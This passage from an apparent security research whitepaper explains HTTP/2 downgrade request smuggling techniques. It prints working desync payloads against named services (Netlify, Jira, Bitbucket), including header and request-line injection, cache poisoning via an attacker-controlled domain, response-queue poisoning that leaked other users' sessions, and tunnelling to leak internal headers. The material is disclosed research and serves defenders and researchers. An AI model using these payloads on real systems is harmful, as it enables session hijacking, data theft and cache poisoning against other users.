\r\n 
GET / HTTP/1.1\r\n 
Host: evil-netlify-domain\r\n 
Content-Length: 5\r\n 
\r\n 
x=
During the downgrade, the \r\n triggered a request header injection vulnerability, introducing an extra header:
Transfer-Encoding: chunked
POST / HTTP/1.1\r\n 
Host: start.mozilla.org\r\n 
Foo: b\r\n 
Transfer-Encoding: chunked\r\n 
Content-Length: 77\r\n 
\r\n 
0\r\n
\r\n 
GET / HTTP/1.1\r\n 
Host: evil-netlify-domain\r\n 
Content-Length: 5\r\n 
\r\n 
x=
This triggered an H2.TE desync, with a prefix designed to make the victim receive malicious content from
my own Netlify domain. Thanks to Netlify's cache setup, the harmful response would be saved and
persistently served to anyone else trying to access the same URL. In effect, I could take full control over
every page on every site on the Netlify CDN. This was awarded with $2,000 and $2,000 from Mozilla and
Netlify respectively.
H2.X via Request Splitting
Atlassian's Jira looked like it had a similar vulnerability. I created a simple proof-of-concept intended to
trigger two distinct responses - a normal one, and the robots.txt file. The actual result was something else
entirely. To watch a video recording of the result, please refer to the online version of this whitepaper9.
The server started sending me responses clearly intended for other Jira users, including a vast quantity of
sensitive information and PII.
The root cause was a small optimization I'd made when crafting the payload. I'd decided that instead of using
\r\n to smuggle a Transfer-Encoding header, it'd be better to use a double-\r\n to terminate the first request,
letting me directly include my prefix in the header:
:method GET
:path /
:authority ecosystem.atlassian.net
foo bar 
Host: ecosystem.atlassian.net 
GET /robots.txt HTTP/1.1 
X-Ignore: x
This approach avoided the need for chunked encoding, a message body, and the POST method. However, it
failed to account for a crucial step in the HTTP downgrade process - the front-end must terminate the headers
with \r\n\r\n sequence. This led to it terminating the prefix, turning it into a complete standalone request:
GET / HTTP/1.1 
Foo: bar 
Host: ecosystem.atlassian.net 
GET /robots.txt HTTP/1.1 
X-Ignore: x 
Host: ecosystem.atlassian.net\r\n 
\r\n
Instead of the back-end seeing 1.5 requests as usual, it saw exactly 2. I received the first response, but the
next user received the response to my smuggled request. The response they should've received was then sent
to the next user, and so on. In effect, the front-end started serving each user the response to the previous
user's request, indefinitely.
Req1
Resp1
Req2
Req3
Resp2
Req4
Resp3
Resp4
To make matters worse, some of these contained Set-Cookie headers that persistently logged users into other
users' accounts. After deploying a hotfix, Atlassian opted to globally expire all user sessions.
This potential impact is mentioned in Practical Attacks Using HTTP Request Smuggling10 by @defparam,
but I think the prevalence is underestimated. For obvious reasons, I haven't tried it on many live sites, but to
my understanding this exploit path is nearly always possible. So, if you find a request smuggling
vulnerability and the vendor won't take it seriously without more evidence, smuggling exactly two requests
should get them the evidence they're looking for.
The front-end that made Jira vulnerable was PulseSecure Virtual Traffic Manager11. Atlassian awarded
$15,000 - triple their max bounty.
In addition to Netlify and PulseSecure Virtual Traffic Manager, this technique also predictably worked on
Imperva Cloud WAF.
H2.TE via Header Name Injection
While waiting for PulseSecure's patch, Atlassian tried out a few hotfixes. The first one disallowed newlines
in header values, but failed to filter header names. This was easy to exploit as the server tolerated colons in
header names - something else that's impossible in HTTP/1.1:
:method POST
:path /
:authority ecosystem.atlassian.net
foo: bar
transfer-encoding
chunked 
GET / HTTP/1.1 
foo: bar 
transfer-encoding: chunked 
host: ecosystem.atlassian.net
H2.TE via Request Line Injection
The initial hotfix also didn't filter pseudo-headers, leading to a request line injection vulnerability.
Exploitation of these is straightforward, just visualize where the injection is happening and ensure the
resulting HTTP/1.1 request has a valid request line:
:method GET / HTTP/1.1 
Transfer-encoding: chunked 
x: x
:path /ignored
:authority ecosystem.atlassian.net
GET / HTTP/1.1 
transfer-encoding: chunked 
x: x /ignored HTTP/1.1 
Host: eco.atlassian.net 
The final flaw in the hotfix was the classic mistake of blocking '\r\n' but not '\n' by itself - the latter is almost
always sufficient for an exploit.
Desync-Powered Request Tunnelling
Next up, let's take a look at something that's less flashy, less obvious, but still dangerous. During this
research, I noticed one subclass of desync vulnerability that has been largely overlooked due to lack of
knowledge on how to confirm and exploit it. In this section, I'll explore the theory behind it, then tackle these
problems.
Whenever a front-end receives a request, it has to decide whether to route it down an existing connection to
the back-end, or establish a new connection to the back-end. The connection-reuse strategy adopted by the
front-end can have a major effect on which attacks you can successfully launch.
Most front-ends are happy to send any request down any connection, enabling the cross-user attacks we've
already seen. However, sometimes, you'll find that your prefix only influences requests coming from your
own IP. This happens because the front-end is using a separate connection to the back-end for each client IP.
It's a bit of a nuisance, but you can often work around it by indirectly attacking other users via cache
poisoning.
Some other front-ends enforce a one-to-one relationship between connections from the client, and
connections to the back-end. This is an even stronger restriction, but regular cache poisoning and internal
header leaking techniques still apply.
When a front-end opts to never reuse connections to the back-end, life gets really quite challenging. It's
impossible to send a request that directly affects a subsequent request:
This leaves one exploit primitive to work with: request tunnelling. This primitive can also arise from
alternate means like H2C smuggling12, but this section will be focused on desync-powered tunnelling.
Tunnelling Confirmation
Detecting request tunneling is easy - the usual timeout technique works fine. The first true challenge is
confirming the vulnerability - you can confirm regular request smuggling vulnerabilities by sending a flurry
of requests and seeing if an early request affects a later one. Unfortunately, this technique will always fail to
confirm request tunnelling, making it extremely easy to mistake the vulnerability for a false positive.
We need a new confirmation technique. One obvious approach is to simply smuggle a complete request and
see if you get two responses:
POST / HTTP/1.1 
Host: example.com 
Transfer-Encoding: chunked 
0 
GET / HTTP/1.1 
Host: example.com 
HTTP/1.1 301 Moved Permanently 
Content-Length: 162 
Location: /en 
301 Moved… 
HTTP/1.1 301 Moved Permanently 
Content-Length: 162… 
Unfortunately, the response shown here doesn't actually tell us this server is vulnerable! Concatenating
multiple responses is just how HTTP/1.1 keep-alive works, so we don't know whether the front-end thinks
it's sending us one response (and is vulnerable) or two (and is secure). Fortunately, HTTP/2 neatly fixes this
problem for us. If you see HTTP/1 headers in an HTTP/2 response body, you've just found yourself a desync:
:method POST
:path /
:authority example.com
transfer-encoding chunked
0 
GET / HTTP/1.1 
Host: example.com 
:status 301
location /en
301 Moved… 
HTTP/1.1 301 Moved Permanently 
Content-Length: 162… 
Tunnel Vision
Thanks to a second problem, this approach doesn't always work. The front-end server often uses the Content-
Length on the back-end's response to decide how many bytes to read from the socket. This means that even
though you can make two requests hit the back-end, and trigger two responses from it, the front-end only
passes you the first, less interesting response
In the following example, thanks to the highlighted Content-Length, the 403 response shown in orange is
never develivered to the user:
POST /images/tiny.png HTTP/1.1 
Transfer-Encoding: chunked 
0 
POST / HTTP/1.1 
…
HTTP/1.1 200 OK 
Content-Length: 7 
content 
HTTP/1.1 403  
…
Sometimes, persistence can substitute for insight. Bitbucket was vulnerable to blind tunnelling, and after
repeated efforts over four months, I found a solution by blind luck. The endpoint was returning a response so
large that it made Burp Repeater lag slightly, so I decided to shorten it by switching my method from POST
to HEAD. This was effectively asking the server to return the response headers, but omit the response body:
HEAD /images/tiny.png HTTP/1.1 
Transfer-Encoding: chunked 
0 
POST / HTTP/1.1 
...
Sure enough, this led to the back-end serving only the response headers... including the Content-Length
header for the undelivered body! This made the front-end over-read and serve up part of the response to the
second, smuggled request:
HTTP/1.1 200 OK 
Content-Length: 7 
HTTP/1.1 403 
…
So, if you suspect a blind request tunnelling vulnerability, try HEAD and see what happens. Thanks to the
timing-sensitive nature of socket reads, it might require a few attempts, and you'll find it's easier to read
smuggled responses that get served quickly. Sometimes when HEAD fails, OPTIONS will work instead.
Tunnelling Exploitation: Guessing Internal Headers
Request tunnelling lets you hit the back-end with a request that is completely unprocessed by the front-end.
The most obvious exploit path is to use this to bypass front-end security rules like path restrictions. However,
you'll often find there aren't any relevant rules to bypass. Fortunately, there's a second option.
Front-end servers often inject internal headers used for critical functions, such as specifying who the user is
logged in as. Attempts to exploit these headers directly usually fail due to the front-end detecting and
rewriting them. You can use request tunnelling to bypass this rewrite and successfully smuggle internal
headers.
There's one catch - internal headers are often invisible to attackers, and it's hard to exploit a header you don't
know the name of. To help out, I've just released an update to Param Miner13 that adds support for guessing
internal header names via request tunnelling. As long as the server's internal header is in Param Miner's
wordlist, and causes a visible difference in the server's response, Param Miner should detect it.
Tunnelling Exploitation: Leaking Internal Headers
Custom internal headers that are not present in Param Miner's static wordlist or leaked in site traffic may
evade detection. Regular request smuggling can be used to make the server leak its internal headers to the
attacker, but this approach doesn't work for request tunnelling.
Fortunately, if you can inject newlines in headers via HTTP/2, there's another way to discover internal
headers. Classic desync attacks rely on making the two servers disagree about where the body of a request
ends, but with newlines we can instead cause disagreement about where the body starts!
To obtain the internal headers used by bitbucket, I issued the following request:
:method POST
:path /blog
:authority bitbucket.org
foo bar 
Host: bitbucket.wpengine.com 
Content-Length: 200 
s=cow
foo=bar
After being downgraded, it looked something like:
POST /blog HTTP/1.1 
Foo: bar 
Host: bitbucket.wpengine.com 
Content-Length: 200 
s=cow
SSLClientCipher: TLS_AES_128 
Host: bitbucket.wpengine.com 
Content-length: 7 
foo=bar
Can you see what I've done here? Both the front-end and back-end think I've sent one request, but they get
confused about where the body starts. The front-end thinks 's=cow' is part of the headers, so it inserts the
internal headers after that. This means the back-end ends up treating the internal headers as part of the 's'
POST parameter I'm sending to Wordpress' search function... and reflects them back: